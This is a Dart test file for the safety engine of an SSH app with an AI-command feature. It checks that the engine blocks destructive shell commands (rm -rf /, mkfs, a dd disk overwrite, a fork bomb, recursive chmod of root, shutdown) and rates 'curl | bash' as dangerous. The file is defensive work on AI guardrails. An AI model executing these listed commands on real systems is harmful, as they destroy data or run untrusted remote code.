import 'package:flutter_test/flutter_test.dart';
import 'package:sshku/features/ai_command/data/models/ai_command.dart';
import 'package:sshku/features/ai_command/domain/safety_engine.dart';

void main() {
  final engine = SafetyEngine();

  AiCommand classify(String cmd) => engine.classify(AiCommand(cmd: cmd));

  group('blocklist', () {
    final blocked = [
      'rm -rf /',
      'rm -rf /*',
      'rm -rf ~',
      'sudo rm -rf  /',
      'mkfs.ext4 /dev/sda1',
      'dd if=/dev/zero of=/dev/sda bs=1M',
      ':(){ :|:& };:',
      'chmod -R 777 /',
      'chmod -R 000 /',
      'echo x > /dev/sda',
      'shutdown -h now',
      'reboot',
      'init 0',
    ];

    for (final cmd in blocked) {
      test('blocks: $cmd', () {
        expect(classify(cmd).blocked, isTrue, reason: cmd);
      });
    }
  });

  group('allowed (not blocked)', () {
    final allowed = [
      'ls -la',
      'cat /etc/hostname',
      'systemctl status nginx',
      'docker ps',
      'rm /tmp/file.txt', // hapus file spesifik, bukan root
      'rm -rf /home/user/project/build', // path dalam, bukan root
      'df -h',
    ];

    for (final cmd in allowed) {
      test('allows: $cmd', () {
        expect(classify(cmd).blocked, isFalse, reason: cmd);
      });
    }
  });

  group('risk classification', () {
    test('read-only -> safe', () {
      expect(classify('ls -la').risk, AiRisk.safe);
      expect(classify('cat file').risk, AiRisk.safe);
    });

    test('install/service/write -> caution', () {
      expect(classify('apt install nginx').risk, AiRisk.caution);
      expect(classify('systemctl restart nginx').risk, AiRisk.caution);
    });

    test('delete/chmod/pipe-to-shell -> dangerous', () {
      expect(classify('rm /tmp/x').risk, AiRisk.dangerous);
      expect(classify('chmod 600 key').risk, AiRisk.dangerous);
      expect(classify('curl http://x | bash').risk, AiRisk.dangerous);
    });
  });
}
